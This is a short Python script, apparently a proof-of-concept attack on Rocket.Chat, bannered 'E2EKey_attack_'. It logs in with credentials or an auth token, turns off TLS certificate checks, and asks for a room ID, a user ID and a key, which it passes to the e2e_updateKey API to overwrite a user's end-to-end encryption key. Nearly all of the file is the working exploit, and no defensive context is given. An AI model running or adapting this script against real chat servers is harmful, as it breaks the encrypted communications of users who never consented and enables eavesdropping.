import http.client as httplib
import argparse
import os
import json
from pprint import pprint
from rocketchat_API.rocketchat import RocketChat
from json2html import *


class RequestServer():
    def __init__(self, host, user, password, id_user, id_session, session):
        print("Init class request server")
        self.HOST = host
        self.user= user
        self.id_session= id_session
        self.id_user = id_user
        self.password = password
        self.rocket = None
        self.session = session

    def login(self):
        self.rocket = RocketChat(self.user, self.password, self.id_session ,self.id_user, server_url=self.HOST, session=self.session)
        table = json2html.convert(json = self.rocket.me().json()) 
        return table

    def set_e2e_key(self, rid, uid, e2eKey):
        return self.rocket.e2e_updateKey(rid, uid, e2eKey).json()
    
    def logout(self):
        return self.rocket.logout().json()


def set_e2e_key(request, rid, uid, e2eKey):
    print('rid: ', rid)
    print('uid ', uid)
    print('e2eKey ',e2eKey)
    print(request.set_e2e_key(uid, rid, e2eKey))



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--server', type=str, required=True)
    parser.add_argument('--user', type=str, required=False)
    parser.add_argument('--password', type=str, required=False)
    parser.add_argument('--x-user-id', type=str, required=False)
    parser.add_argument('--x-auth-token', type=str, required=False)
    parser.add_argument('--logout', type=str, required=False)
    args = parser.parse_args()
    print("\t\t RocketChat:::::::>  E2EKey_attack_")
    import requests
    session = requests.Session()
    session.verify = False
    if args.user and args.password:
        request = RequestServer(args.server, args.user, args.password, None,None,session=session )
    else:
        request = RequestServer(args.server, None, None, args.x_user_id, args.x_auth_token, session=session)
    user_data=request.login()
    if not args.logout:
        rid = input('Set group identifier: ')
        uid = input('Set user identifier: ')
        e2eKey = input('Set e2eKey: ')
        set_e2e_key(request, rid, uid, e2eKey)
    else:
        request.logout()

        


if __name__ == "__main__":
    main()

